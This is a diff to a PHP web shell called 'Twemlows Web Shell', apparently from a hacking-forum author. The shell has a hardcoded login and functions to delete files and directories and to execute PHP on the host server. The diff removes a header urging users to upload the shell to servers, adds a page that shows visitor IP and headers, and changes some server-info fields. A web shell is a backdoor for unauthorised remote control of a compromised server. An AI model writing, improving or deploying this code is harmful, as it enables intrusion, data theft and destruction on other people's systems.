@@ -14,24 +14,14 @@
                                                                                                                               |  $$$$$$/          
                                                                                                                                \______/           */
 
-/*How to use? Simply find your prefered way of uploading this shell to a server and then login. You'll have access to the servers directories, be able to perform server commands, change file permissions,
-edit and delete files, create new directories,files and upload additional files to the server as well as download files from the server to your local machine.
-
-I'm not your mother, so I won't tell you not to use this shell for malicious use, were all capable of making smart and dump decisions, the one you make is what will depict your future.
-
-I have provided you a way to check your IP and perform your own DNS leak test just so you can test your own anonymity.
-
-Some unicode characters might not work depending on the editor it is that you're using. You may see "- ?" instead of the emojis so please adjust your editors so you can see the emojis.
-
-Please report any bugs to --> LoseThos@protonmail.com <--*/
 //- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 // Login Page
 error_reporting(0); 
 set_time_limit(0);
 session_start();
-$login='Twemlow'; // Username
-$password='Emrys'; // Password
-$auth=1; // Authentication
+$login='Twemlow';
+$password='Emrys';
+$auth=1;
 $header='<html><head><title>'.getenv("HTTP_HOST").' -【༺ Twemlows Web Shell ༻】</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">';
 $footer='</body></html>';
 if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';
@@ -39,7 +29,6 @@ if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SES
 if($_SESSION['an']==0){
 echo $header;
 echo '<center><table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 2px solid"><tr><td align=center><b><font color=#000000><center><font color=#800080 size=4><b>༺♔ King ♔༻</font></b><br><b><font color=#800080 size=4>༺࿇ Twemlow ࿇༻<center><table><form method="POST"><tr><td><font color=#800080 size=4>【Login】:</td><td><input type="text" name="login" value=""></td></tr><tr><td><font color=#800080 size=4>【Password】:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center><br></font></b></b></td></tr>';
-echo '<center><font color=#800080 size=4><b>So my code defeats you again huh? Shame...</font></b><br>';
 echo '<center><img src="https://www.nulled.to/uploads/profile/photo-1822548.gif?_r=1589365892" border="0"width="350px" height="250px"><br>';
 echo '<center><table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 2px solid"><tr><td align=center><b><font color=#000000>【Visit Me </font><a href="https://www.nulled.to/user/4397640-twemlowsemrys" target="_blank">Twemlows Shell</font><a>】</b></td></tr>';
 
@@ -92,7 +81,6 @@ class shell
    return '';
   return str_replace($_SERVER['DOCUMENT_ROOT'],'',$_SESSION['currentdir'].'/');
  }
-
  // Delete Files
  function deletefile()
  {
@@ -107,7 +95,6 @@ class shell
   else
    return 'Failed to delete file!';
  }
-
 // Delete Directories
   function removedir()
  {
@@ -197,7 +184,7 @@ $res[] = (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x02
 
 return $res;
 }
-// Houses the contents of the shell. Shell border, Title and spin animation
+// Houses the contents of the shell. Shell border, Title and spin animation, etc.
 function shellWindow()
 {
 $res = '';
@@ -241,6 +228,9 @@ function pageTitles()
   <td colspan=7 align="center">
    <table border=0 cellspacing=0 cellpadding=0>
     <tr align="center">
+    <td width=150>
+	  【<a href="'.$xshell.'?act=user_info">User</a>】
+	 </td>
 	 <td width=250>
 	  【<a href="'.$xshell.'?act=info">Server Overview</a>】
 	 </td>
@@ -341,19 +331,42 @@ function serverOverview()
  <tr>
   <td colspan=7 align="left"><br>
    <ol>
-    <b><font color=#000000>➤</font></b><font color=#000000> <b><font color=#000000>User Group</b></font>: '.( get_current_user()).' <b><br><br>
-    <b><font color=#000000>➤ Client IP: </font></b><font color=#000000>'.$_SERVER["REMOTE_ADDR"].'</font><br><br>
-    <b><font color=#000000>➤ Your IP: </font></b><font color=#000000>'.$_SERVER["HTTP_CLIENT_IP"].'</font><br><br>
-    <b><font color=#000000>➤ Check Your IP: <a href="https://dnsleaktest.com" target="_blank">Check IP<a><br><br> 
-    <b><font color=#000000>➤ Server IP: </font></b><font color=#000000>'.$_SERVER["SERVER_ADDR"].'</font><br><br>
-    <b><font color=#000000>➤ Server Port: </font></b><font color=#000000>'.$_SERVER["SERVER_PORT"].'</font><br><br>
     <b><font color=#000000>➤ Server OS: </font></b><font color=#000000>'.(php_uname()).'</font><br><br>
+    <b><font color=#000000>➤ Server IP: </font></b><font color=#000000>'.$_SERVER["HTTP_HOST"].'</font><br><br>
+    <b><font color=#000000>➤ Server Port: </font></b><font color=#000000>'.$_SERVER["SERVER_PORT"].'</font><br><br>
     <b><font color=#000000>➤ Server Address: </font></b><font color=#000000>'.$_SERVER["SERVER_NAME"].'</font><br><br>
     <b><font color=#000000>➤ Server Software: </font></b><font color=#000000>'.$_SERVER["SERVER_SOFTWARE"].'</font><br><br>
     <b><font color=#000000>➤ Server Admin: </font></b><font color=#000000>'.$_SERVER["SERVER_ADMIN"].'</font><br><br>
+    <b><font color=#000000>➤ Page Request Method: </font></b><font color=#000000>'.$_SERVER["REQUEST_METHOD"].'</font><br><br>
     <b><font color=#000000>➤ Server Protocol: </font></b><font color=#000000>'.$_SERVER["SERVER_PROTOCOL"].'</font><br><br>
-    <b><font color=#000000>➤ Page URL: </font></b><font color=#000000>'.$_SERVER["REQUEST_URI"].'</font><br><br>
     <b><font color=#000000>➤ PHP Version: </font></b><font color=#000000>'.(phpversion()).'</font><br><br> 
+</td>
+ </tr>
+ <table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 2px solid">
+<tr><td align=center><b><font color=#000000>【Visit Me </font><a href="https://www.nulled.to/user/4397640-twemlowsemrys" target="_blank">Twemlows Shell</font><a>】</b></td>⬇</tr>';
+
+ return $res;
+}
+// User information
+function userOverview()
+{
+ $res = '';
+ $res .= '<tr>
+  <td align="center" colspan=7>
+   <b><font color=#800080>User Overview</font></b>
+  </td>
+ </tr>
+ <tr>
+  <td colspan=7 align="left"><br>
+   <ol>
+    <b><font color=#000000>➤</font></b><font color=#000000> <b><font color=#000000>User Group</b></font>: '.( get_current_user()).' <b><br><br>
+    <b><font color=#000000>➤ Your IP: </font></b><font color=#000000>'.$_SERVER["REMOTE_ADDR"].'</font><br><br>
+    <b><font color=#000000>➤ Where you just came from: </font></b><font color=#000000>'.$_SERVER["HTTP_REFERER"].'</font><br><br>
+    <b><font color=#000000>➤ Check Your IP: <a href="https://dnsleaktest.com" target="_blank">Check IP<a><br><br> 
+    <b><font color=#000000>➤ User Agent: </font></b><font color=#000000>'.$_SERVER["HTTP_USER_AGENT"].'</font><br><br>
+    <b><font color=#000000>➤ Originating IP address: </font></b><font color=#000000>'.$_SERVER["HTTP_X_FORWARDED_FOR"].'</font><br><br>
+    <b><font color=#000000>➤ Page URL: </font></b><font color=#000000>'.$_SERVER["REQUEST_URI"].'</font><br><br>
+    <b><font color=#000000>➤ Doc Root: </font></b><font color=#000000>'.$_SERVER["DOCUMENT_ROOT"].'</font><br><br>
 </td>
  </tr>
  <table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 2px solid">
@@ -657,6 +670,10 @@ function uploadfile()
   // Server Overview
   case 'info':
    $content .= $shell->serverOverview();
+  break;
+  // User Overview
+  case 'user_info':
+   $content .= $shell->userOverview();
   break;
   // Execute PHP
   case 'execute':
